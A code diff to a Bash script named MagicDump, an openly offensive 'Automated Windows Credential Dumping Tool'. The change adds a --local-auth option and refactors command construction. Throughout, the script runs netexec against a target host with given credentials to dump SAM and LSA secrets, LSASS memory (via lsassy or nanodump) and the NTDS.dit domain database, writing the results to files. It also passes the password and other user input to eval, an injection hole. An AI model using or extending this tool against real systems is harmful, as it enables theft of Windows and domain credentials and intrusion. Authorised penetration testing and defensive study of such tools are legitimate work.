@@ -38,12 +38,13 @@ trap "rm -f tmp.$$.json" EXIT
 usage() {
   echo "MagicDump - Automated Windows Credential Dumping Tool"
   echo ""
-  echo "Usage: $0 -t <target_ip> -u <username> -p <password> [-v|--verbose]"
+  echo "Usage: $0 -t <target_ip> -u <username> -p <password> [--local-auth] [-v|--verbose]"
   echo ""
   echo "Options:"
   echo "  -t, --target     Target IP address of the Windows machine"
   echo "  -u, --username   Username for authentication"
   echo "  -p, --password   Password for authentication"
+  echo "      --local-auth Use local authentication"
   echo "  -v, --verbose    Enable verbose output for debugging"
   echo "  -h, --help       Show this help message and exit"
   echo ""
@@ -55,6 +56,8 @@ TARGET_HOST=""
 USERNAME=""
 PASSWORD=""
 VERBOSE=0
+LOCAL_AUTH=0  # Default: Do not use local authentication
+
 while [[ $# -gt 0 ]]; do
   case "$1" in
     -t|--target)
@@ -68,6 +71,10 @@ while [[ $# -gt 0 ]]; do
     -p|--password)
       PASSWORD="$2"
       shift 2
+      ;;
+    --local-auth)
+      LOCAL_AUTH=1
+      shift
       ;;
     -v|--verbose)
       VERBOSE=1
@@ -91,6 +98,7 @@ fi
 
 # Verbose mode
 [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Verbose mode enabled"
+[[ $LOCAL_AUTH -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Local authentication enabled (--local-auth)"
 
 # Define log file
 LOG_FILE="$LOG_DIR/report_${TARGET_HOST}_$(date +%Y%m%d%H%M%S).json"
@@ -136,17 +144,20 @@ run_command() {
   eval "$cmd"
 }
 
-# Function to display credentials
-display_credentials() {
-  local creds="$1"
-  echo -e "${GREEN}[CREDENTIALS FOUND]:${RESET}\n$creds"
+# Function to construct the base command
+construct_base_cmd() {
+  local base_cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD'"
+  [[ $LOCAL_AUTH -eq 1 ]] && base_cmd+=" --local-auth"
+  echo "$base_cmd"
 }
 
 # Function to execute SAM dump
 dump_sam() {
   local output_file="$DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
+  local cmd
+  cmd=$(construct_base_cmd)" --sam > '$output_file' 2>/dev/null"
+
   add_log "Starting SAM dump using netexec..."
-  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' --sam > '$output_file' 2>/dev/null"
   if run_command "$cmd"; then
     [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} SAM dump completed successfully. Output saved to $output_file"
     log_operation "SAM" "success" "\"file_path\": \"$output_file\""
@@ -161,8 +172,10 @@ dump_sam() {
 # Function to execute LSA dump
 dump_lsa() {
   local output_file="$DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
+  local cmd
+  cmd=$(construct_base_cmd)" --lsa > '$output_file' 2>/dev/null"
+
   add_log "Starting LSA dump using netexec..."
-  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' --lsa > '$output_file' 2>/dev/null"
   if run_command "$cmd"; then
     [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump completed successfully. Output saved to $output_file"
     log_operation "LSA" "success" "\"file_path\": \"$output_file\""
@@ -178,9 +191,10 @@ dump_lsa() {
 dump_lsass() {
   local method="${1:-lsassy}"  # Default to "lsassy" if no method is provided
   local output_file="$DUMP_DIR/LSASS_dump_${TARGET_HOST}.dmp"
-  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD'"
+  local cmd
+  cmd=$(construct_base_cmd)
 
-  # Append the appropriate module to the command based on the method
+  # Append the appropriate module to the command
   case "$method" in
     nanodump)
       cmd+=" -M nanodump"
@@ -209,10 +223,11 @@ dump_lsass() {
 # Function to execute NTDS dump using ntdsutil
 dump_ntds() {
   local output_file="$DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
-  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' -M ntdsutil"
+  local cmd
+  cmd=$(construct_base_cmd)" -M ntdsutil > '$output_file' 2>/dev/null"
 
   add_log "Starting NTDS dump using ntdsutil..."
-  if run_command "$cmd > '$output_file' 2>/dev/null"; then
+  if run_command "$cmd"; then
     [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump completed successfully. Output saved to $output_file"
     log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
     add_log "NTDS dump saved to $output_file"
